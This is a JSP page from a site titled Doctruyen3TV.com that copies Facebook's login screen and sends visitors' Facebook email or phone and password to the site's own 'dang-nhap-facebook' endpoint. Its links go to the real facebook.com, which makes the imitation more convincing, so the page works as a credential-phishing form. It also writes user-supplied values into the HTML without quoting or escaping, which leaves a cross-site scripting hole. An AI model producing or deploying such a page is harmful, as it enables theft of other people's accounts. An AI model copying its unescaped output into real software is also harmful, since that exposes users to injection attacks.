<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Doctruyen3TV.com</title>
<link
	href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/	css/bootstrap.min.css"
	rel="stylesheet"
	integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
	crossorigin="anonymous">
<script
	src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
	integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
	crossorigin="anonymous"></script>
<script
	src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
	integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
	crossorigin="anonymous"></script>

<style>
body {
	background-color: #f0f2f5;
}

.navbar {
	background-color: #365798 !important;
	height: 73px;
}

.navbar-brand {
	font-size: 38px;
	color: white;
	font-weight: bold;
	text-decoration: none;
	margin-left: 223px;
	pointer-events: none; /* Ngăn không cho di chuột vào */
}

.login-box {
	background-color: white;
	padding: 30px;
	border-radius: 3px;
	box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
	width: 585px;
	height: auto;
	position: absolute;
	left: 50%;
	transform: translateX(-50%);
	top: 148px;
}

.login-box h2 {
	text-align: center;
	margin-bottom: 15px;
	margin-top: 20px;
	font-family: Arial, sans-serif;
	font-size: 20px;
}

.form-label {
	font-size: 14px;
}

.form-control.custom-size {
	width: 100%;
	max-width: 330px;
	margin: 0 auto;
	border-radius: 2px;
	color: #9F9C9B;
}

.form-control.custom-size+.form-control.custom-size {
	margin-top: 15px;
	margin-bottom: 10px;
	font-size: 14px;
	font-family: Arial;
}

.btn-primary {
	background-color: #385a9b;
	width: 100%;
	max-width: 330px;
	height: 45px;
	font-size: 14px;
	font-weight: bold;
	text-align: center;
	margin: 0 auto;
	display: block;
	border-radius: 2px;
}

.btn-success {
	background-color: #53b928;
	border: none;
	border-radius: 2px;
	width: 50%;
	max-width: 175px;
	height: 45px;
	font-size: 14px;
	font-weight: bold;
	text-align: center;
	margin: 0 auto;
	display: block;
	color: white;
}

.login-box .form-control {
	margin-bottom: 15px;
}

.forgot-password {
	text-align: center;
	margin-top: 15px;
}

.forgot-password a {
	color: #385a9b;
	text-decoration: none;
	font-size: 15px;
}

.divider-text {
	position: relative;
	text-align: center;
	margin: 15px 0;
}

.divider-text::before, .divider-text::after {
	content: '   ';
	position: absolute;
	top: 50%;
	width: 142px;
	height: 1px;
	background-color: #ddd;
}

.divider-text::before {
	left: 41%;
	transform: translateX(-120px);
}

.divider-text::after {
	right: 41%;
	transform: translateX(120px);
}

.divider-text span {
	display: inline-block;
	padding: 0 10px;
	background-color: white;
	color: #888;
}

.signup-button {
	margin-top: 15px;
	text-align: center;
}

.other-time {
	text-align: center;
	margin-top: 15px;
}

.other-time a {
	color: #385a9b;
	text-decoration: none;
}

.other-time a:hover {
	color: #0056b3;
}

.other-time a:active {
	color: #003d7a;
}
</style>
</head>
<body>
	<!-- Navbar -->
	<nav class="navbar">
		<div class="">
			<span class="navbar-brand">facebook</span>
		</div>
	</nav>

	<%
	String facebook = request.getAttribute("facebook") + "";
	String e_facebook = request.getAttribute("e_facebook") + "";
	facebook = (facebook.equals("null")) ? "" : facebook;
	e_facebook = (e_facebook.equals("null")) ? "" : e_facebook;
	%>
	<!-- Login Box -->
	<div class="container">
		<div class="row justify-content-center align-items-center"
			style="height: 100vh;">
			<div class="col-md-4">
				<div class="login-box">
					<h2>Đăng nhập Facebook</h2>
					<form action="dang-nhap-facebook" method="post">
						<div class="mb-3">
							<input type="text" class="form-control custom-size" id="username"
								placeholder="Nhập email hoặc số điện thoại" name="userFacebook"
								value=<%=facebook%>>
						</div>
						<div class="mb-3">
							<input type="password" class="form-control custom-size"
								id="password" placeholder="Nhập mật khẩu" name="password"
								onkeyup="reChange()">

						</div>
						<div style="color: red; font-size: small;" id="error"><%=e_facebook%></div>
						<button type="submit" class="btn btn-primary w-100">Đăng
							nhập</button>
					</form>
					<div class="forgot-password">
						<a
							href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
							class="text-center">Bạn quên tài khoản ư?</a>
					</div>
					<div class="divider-text ">
						<span>hoặc</span>
					</div>
					<div class="signup-button">
						<a type="button" class="btn btn-success"
							href="https://www.facebook.com/campaign/landing.php?campaign_id=1661697988&extra_1=s%7Cc%7C432702090885%7Ce%7C%C4%91ang%20ky%20facebook%7C&placement=&creative=432702090885&keyword=%C4%91ang%20ky%20facebook&partner_id=googlesem&extra_2=campaignid%3D1661697988%26adgroupid%3D65157402958%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-391993644379%26loc_physical_ms%3D9198864%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gclid=EAIaIQobChMIhLjH_4DWiAMVCVkPAh3OijpeEAAYASAAEgL0XvD_BwE">Tạo
							tài khoản mới</a>
					</div>

					<div class="other-time">
						<a href="#">Lúc khác</a>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script type="text/javascript" src="javascript/script.js" defer="defer"></script>
</body>
</html>
